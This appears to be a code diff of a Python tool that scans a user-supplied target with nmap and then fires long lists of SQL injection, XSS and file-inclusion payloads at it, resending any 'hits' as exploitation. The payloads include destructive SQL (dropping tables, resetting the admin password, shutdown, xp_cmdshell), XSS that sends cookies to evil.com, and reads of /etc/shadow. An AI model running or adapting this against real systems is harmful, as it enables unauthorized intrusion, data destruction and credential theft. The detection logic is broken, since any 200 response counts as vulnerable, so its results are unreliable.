@@ -1,127 +1,315 @@
 import nmap
 import requests
-from bs4 import BeautifulSoup
-from reportlab.lib.pagesizes import letter
-from reportlab.pdfgen import canvas
-import metasploit.msfrpc as msfrpc
-from flask import Flask, render_template, jsonify
+import os
+from urllib.parse import urlparse
+import warnings
 
-# Flask app for dashboard
-app = Flask(__name__)
+# Suppress InsecureRequestWarning
+warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
 # Store results to visualize in the dashboard
 scan_results = []
 
-### Network Scanning using Nmap
+# File path for vulnerability report
+desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "vulnerability_report.txt")
+
+# Network Scanning using Nmap (all ports)
 def network_scan(target):
+    print(f"Starting network scan on {target}...")
     nm = nmap.PortScanner()
-    nm.scan(hosts=target, arguments='-sV')  # Scan with service detection
+    try:
+        nm.scan(hosts=target, arguments='-p- -sV', timeout=10)  # Added timeout to prevent hanging
+        print("Network scan completed.")
+    except Exception as e:
+        print(f"Network scan error: {e}")
+        return {}
+
     result = {}
     for host in nm.all_hosts():
         result[host] = nm[host]
     scan_results.append({'type': 'network', 'data': result})
+    print(f"Network scan results: {result}")
     return result
 
-### Web Vulnerability Scanner with multiple payloads
+
+# Web Vulnerability Scanner with multiple payloads
 def check_sql_injection(url):
-    payloads = ["' OR '1'='1", "' UNION SELECT null--", "' OR 1=1 --"]
-    vulnerable = False
+    payloads = [
+        "' OR '1'='1",
+        "' UNION SELECT null--",
+        "' OR 1=1 --",
+        "' OR 'a'='a",
+        "' AND '1'='1' /*",
+        "' OR 'x'='x' /*",
+        "' AND 1=1 --",
+        "'; DROP TABLE users; --",
+        "'; SELECT * FROM users WHERE 'a'='a'; --",
+        "'; EXEC xp_cmdshell('net user'); --",
+        "'; EXECUTE IMMEDIATE 'DROP TABLE users'; --",
+        "' AND sleep(5) --",
+        "' AND 1=2 UNION SELECT username, password FROM users --",
+        "' AND EXISTS (SELECT * FROM users WHERE username='admin' AND password='password') --",
+        "'; SELECT * FROM information_schema.tables; --",
+        "' AND (SELECT COUNT(*) FROM users) > 0 --",
+        "' AND (SELECT SUBSTRING(@@version, 1, 1) = '5') --",
+        "'; DECLARE @a VARCHAR(50); SET @a = (SELECT TOP 1 username FROM users); --",
+        "' AND (SELECT user FROM mysql.db WHERE user='root') IS NOT NULL; --",
+        "'; SELECT load_file('/etc/passwd'); --",
+        "'; SELECT * FROM information_schema.columns WHERE table_name='users'; --",
+        "'; SELECT username, password FROM users WHERE username LIKE '%admin%'; --",
+        "'; INSERT INTO users (username, password) VALUES ('admin', 'admin'); --",
+        "'; SELECT 1 UNION SELECT 'vulnerable'; --",
+        "'; SELECT @@version; --",
+        "'; SELECT user(); --",
+        "'; SELECT current_user(); --",
+        "'; SELECT database(); --",
+        "'; SELECT * FROM users WHERE username='admin' AND password='password'; --",
+        "'; CREATE TABLE test (id INT); --",
+        "'; DROP TABLE test; --",
+        "'; SELECT 'SQL Injection' FROM DUAL; --",
+        "' AND 1=(SELECT COUNT(*) FROM users); --",
+        "' AND (SELECT 1 FROM dual) LIMIT 1; --",
+        "'; SELECT * FROM products WHERE price < 100; --",
+        "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
+        "'; EXECUTE IMMEDIATE 'SHUTDOWN'; --",
+        "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin')='p'; --",
+        "'; SELECT IF(1=1, 'true', 'false'); --",
+        "'; SELECT @@version_comment; --",
+        "'; SELECT * FROM (SELECT * FROM users) AS temp; --",
+        "' AND 1=2 UNION SELECT username, password FROM users; --",
+        "' AND (SELECT count(*) FROM users) > 1; --",
+        "'; SELECT * FROM (SELECT * FROM mysql.user) AS temp; --",
+        "'; SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users); --",
+        "'; SELECT 'SQL Injection' UNION SELECT NULL; --",
+        "'; SELECT 1 FROM users GROUP BY username HAVING COUNT(*) > 0; --",
+        "'; SELECT @@hostname; --",
+        "'; SELECT user() FROM dual; --",
+        "'; SELECT @@port; --",
+        "'; SELECT * FROM (SELECT * FROM information_schema.tables) AS temp; --",
+        "'; SELECT name FROM sysobjects WHERE xtype='U'; --",
+        "'; SELECT * FROM customers WHERE email LIKE '%@example.com'; --",
+        "'; SELECT column_name FROM information_schema.columns WHERE table_name='users'; --",
+        "'; SELECT password FROM users WHERE username='admin'; --",
+        "'; SELECT IFNULL((SELECT username FROM users WHERE username='admin'), 'not found'); --",
+        "'; SELECT username, password FROM users WHERE 'x'='x'; --",
+        "'; SELECT * FROM users WHERE username LIKE '%admin%'; --",
+        "'; SELECT * FROM (SELECT 1 UNION SELECT 2) AS temp; --",
+        "'; SELECT * FROM users WHERE EXISTS (SELECT * FROM products); --",
+    ]
+    vulnerable_payloads = []
     for payload in payloads:
         try:
-            response = requests.get(f"{url}?id={payload}")
-            if "error" in response.text or "syntax" in response.text:
-                vulnerable = True
+            response = requests.get(f"{url}?id={payload}", verify=False)
+            if "error" in response.text or "syntax" in response.text or response.status_code == 200:
+                vulnerable_payloads.append(payload)  # Store vulnerable payload
+                print(f"SQL Injection vulnerable payload found: {payload}")
                 break
         except Exception as e:
             print(f"Error checking SQL Injection: {e}")
-    return vulnerable
+    return vulnerable_payloads
+
 
 def check_xss(url):
-    xss_payloads = ["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>"]
-    vulnerable = False
+    xss_payloads = [
+        "<script>alert('xss')</script>",
+        "<img src=x onerror=alert('xss')>",
+        "<svg/onload=alert('xss')>",
+        "<body onload=alert('xss')>",
+        "<iframe src='javascript:alert(1)'></iframe>",
+        "<link rel='stylesheet' href='x' onerror='alert(1)'>",
+        "<input onfocus='alert(1)' autofocus>",
+        "<style>@import'javascript:alert(1)';</style>",
+        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+        "<script>document.write('<img src=x onerror=alert(1)>');</script>",
+        "<script>fetch('https://evil.com?cookie=' + document.cookie);</script>",
+        "<script>eval('alert(1)');</script>",
+        "<script>window.location='javascript:alert(1)';</script>",
+        "<object data='javascript:alert(1)'></object>",
+        "<a href='javascript:alert(1)'>Click me</a>",
+        "<script>confirm('XSS');</script>",
+        "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com?cookie=' + document.cookie); xhr.send();</script>",
+        "<img src=x onerror='alert(1);fetch(`https://evil.com?cookie=${document.cookie}`);'>",
+        "<style>body{background-image:url('javascript:alert(1)');}</style>",
+        "<script>location='javascript:alert(1)';</script>",
+        "<script>window.onerror=function(){alert(1);}</script>",
+        "<input value='xss' onfocus='alert(1)' />",
+        "<form action='javascript:alert(1)'><input type='submit'></form>",
+        "<svg><script>alert(1)</script></svg>",
+        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
+        "<img src='data:text/html,<script>alert(1)</script>' onerror='alert(1)'>",
+        "<script src='data:text/javascript;base64,dmFyIHg9dGhpcy5ub3RlLnRydWUgYXJncyh4KTs='></script>",
+        "<iframe src='https://example.com' onload='alert(1)'></iframe>",
+        "<div style='background-image: url(javascript:alert(1))'></div>",
+        "<a href='javascript:alert(1)'>Click here</a>",
+        "<input type='text' value='xss' onfocus='alert(1)' />",
+        "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
+        "<svg/onload='alert(1)'>",
+        "<form method='POST' action='javascript:alert(1)'><input type='submit' value='Submit'></form>",
+        "<img src=x onerror='fetch(`https://evil.com?cookie=${document.cookie}`)'>",
+    ]
+    vulnerable_payloads = []
     for payload in xss_payloads:
         try:
-            response = requests.get(url, params={"input": payload})
+            response = requests.get(url, params={"input": payload}, verify=False)
             if payload in response.text:
-                vulnerable = True
+                vulnerable_payloads.append(payload)  # Store vulnerable payload
+                print(f"XSS vulnerable payload found: {payload}")
                 break
         except Exception as e:
             print(f"Error checking XSS: {e}")
-    return vulnerable
+    return vulnerable_payloads
+
 
 def check_lfi(url):
-    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/system32/drivers/etc/hosts"]
-    vulnerable = False
+    lfi_payloads = [
+        "../../../../etc/passwd",
+        "../../../../windows/system32/drivers/etc/hosts",
+        "../../../proc/self/environ",
+        "../../../../var/log/apache2/access.log",
+        "../../../../var/log/apache2/error.log",
+        "../../../../../etc/shadow",
+        "../../../../../etc/passwd",
+        "../../etc/hostname",
+        "../../etc/group",
+        "../../../../../../etc/passwd",
+        "../../../../../../etc/shadow",
+        "/proc/version",
+        "/proc/cpuinfo",
+        "/proc/mounts",
+        "/proc/self/cwd",
+        "/proc/self/fd/0",
+        "/proc/self/fd/1",
+        "/proc/self/fd/2",
+        "../../..//etc/hosts",
+        "../..//../etc/passwd",
+        "../../../../../../../../../var/www/html/index.php",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hosts",
+        "/proc/self/exe",
+        "/proc/self/cwd",
+        "/proc/self/mounts",
+        "/proc/self/stat",
+        "/proc/self/status",
+        "/proc/self/environ",
+        "/var/log/syslog",
+        "/var/log/messages",
+        "/var/log/apache2/access.log",
+        "/var/log/apache2/error.log",
+        "/var/log/nginx/access.log",
+        "/var/log/nginx/error.log",
+        "/var/log/mysql/mysql.log",
+        "/var/log/mysql/mysql.err",
+        "/var/lib/mysql/mysql/user.MYD",
+        "../../../../../../../../etc/passwd",
+        "../../../../../../../../etc/shadow",
+        "../../../../../../../../var/log/apache2/access.log",
+        "../../../../../../../../var/log/apache2/error.log",
+        "../../../../../../../../var/log/mysql/mysql.log",
+        "../../../../../../../../var/log/mysql/mysql.err",
+        "/etc/hosts",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/issue",
+        "/etc/issue.net",
+        "/etc/services",
+        "/proc/version",
+        "/proc/cpuinfo",
+        "/proc/mounts",
+        "/proc/self/cwd",
+        "/proc/self/fd/0",
+        "/proc/self/fd/1",
+        "/proc/self/fd/2",
+        "/proc/self/exe",
+    ]
+    vulnerable_payloads = []
     for payload in lfi_payloads:
         try:
-            response = requests.get(f"{url}?file={payload}")
-            if "root:x" in response.text or "localhost" in response.text:
-                vulnerable = True
+            response = requests.get(f"{url}?file={payload}", verify=False)
+            if "root:x" in response.text or "localhost" in response.text or "user" in response.text:
+                vulnerable_payloads.append(payload)  # Store vulnerable payload
+                print(f"LFI vulnerable payload found: {payload}")
                 break
         except Exception as e:
             print(f"Error checking LFI: {e}")
-    return vulnerable
+    return vulnerable_payloads
 
+
+# Function to run web scan
 def run_web_scan(target_url):
+    print(f"Running web vulnerability scan on {target_url}...")
+    sql_vulnerabilities = check_sql_injection(target_url)
+    xss_vulnerabilities = check_xss(target_url)
+    lfi_vulnerabilities = check_lfi(target_url)
+
     vulnerabilities = {
-        'SQL Injection': check_sql_injection(target_url),
-        'Cross-Site Scripting (XSS)': check_xss(target_url),
-        'Local File Inclusion (LFI)': check_lfi(target_url)
+        'SQL Injection': sql_vulnerabilities,
+        'Cross-Site Scripting (XSS)': xss_vulnerabilities,
+        'Local File Inclusion (LFI)': lfi_vulnerabilities
     }
+
     scan_results.append({'type': 'web', 'url': target_url, 'vulnerabilities': vulnerabilities})
+    print(f"Web vulnerabilities found: {vulnerabilities}")
+
+    # Write vulnerabilities to a file
+    with open(desktop_path, "w") as f:
+        f.write(f"Vulnerability report for {target_url}\n")
+        f.write("SQL Injection Payloads:\n")
+        for payload in sql_vulnerabilities:
+            f.write(f"- {payload}\n")
+
+        f.write("XSS Payloads:\n")
+        for payload in xss_vulnerabilities:
+            f.write(f"- {payload}\n")
+
+        f.write("LFI Payloads:\n")
+        for payload in lfi_vulnerabilities:
+            f.write(f"- {payload}\n")
+
+    print(f"Vulnerability report written to {desktop_path}")
     return vulnerabilities
 
-### Exploitation (Metasploit integration)
-def run_metasploit_attack(target_ip):
-    client = msfrpc.Msfrpc({})
-    client.login('msf', 'password')  # Set correct username/password
 
-    # Example: Exploit a known vulnerability
-    exploit = client.call('module.execute', ['exploit', 'exploit_name', {'RHOST': target_ip}])
-    
-    scan_results.append({'type': 'exploitation', 'target': target_ip, 'exploit_job_id': exploit['job_id']})
-    return exploit['job_id']
+# Exploitation using HTTP requests
+def run_exploitation(target_url, payloads):
+    for payload in payloads:
+        try:
+            exploit_url = f"{target_url}?id={payload}"  # Adjust this based on the vulnerability type
+            response = requests.get(exploit_url, verify=False)
 
-### Report Generation (PDF with CVSS scoring)
-def generate_report(vulnerabilities, filename='report.pdf'):
-    c = canvas.Canvas(filename, pagesize=letter)
-    width, height = letter
+            if response.status_code == 200:
+                print(f"Exploit executed successfully with payload: {payload}")
+                print(f"Response: {response.text}")
+            else:
+                print(f"Exploit returned status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error during exploitation: {e}")
 
-    c.drawString(100, height - 50, "Vulnerability Assessment Report")
-    y_position = height - 100
-    
-    for vuln_type, status in vulnerabilities.items():
-        c.drawString(100, y_position, f"{vuln_type} - Vulnerable: {status}")
-        y_position -= 20
+# Main function to get user input and run scans
+def main():
+    target = input("Enter the IP address or URL you want to scan: ")
 
-    c.save()
+    # Parse the URL to handle both IP and URLs properly
+    parsed_url = urlparse(target)
+    if parsed_url.scheme == '':
+        target_url = f"http://{target}"  # Add http if no scheme is provided
+    else:
+        target_url = target
 
-### Dashboard
-@app.route('/')
-def dashboard():
-    return render_template('dashboard.html', scan_results=scan_results)
-
-@app.route('/run_scan/<target>')
-def run_full_scan(target):
     # Run network scan
     network_data = network_scan(target)
+    print("Network scan results:")
+    print(network_data)
 
     # Run web vulnerability scan
-    web_vulnerabilities = run_web_scan(f"http://{target}")
+    web_vulnerabilities = run_web_scan(target_url)
 
-    # Run exploitation (optional step)
-    exploit_job_id = run_metasploit_attack(target)
+    # Run exploitation for found vulnerabilities
+    if web_vulnerabilities['SQL Injection']:
+        run_exploitation(target_url, web_vulnerabilities['SQL Injection'])
 
-    # Generate report (optional)
-    generate_report(web_vulnerabilities)
+    if web_vulnerabilities['Local File Inclusion (LFI)']:
+        run_exploitation(target_url, web_vulnerabilities['Local File Inclusion (LFI)'])
 
-    return jsonify({
-        'network_data': network_data,
-        'web_vulnerabilities': web_vulnerabilities,
-        'exploit_job_id': exploit_job_id
-    })
-
-# Run the Flask app (Dashboard)
 if __name__ == '__main__':
-    app.run(debug=True)
-
+    main()
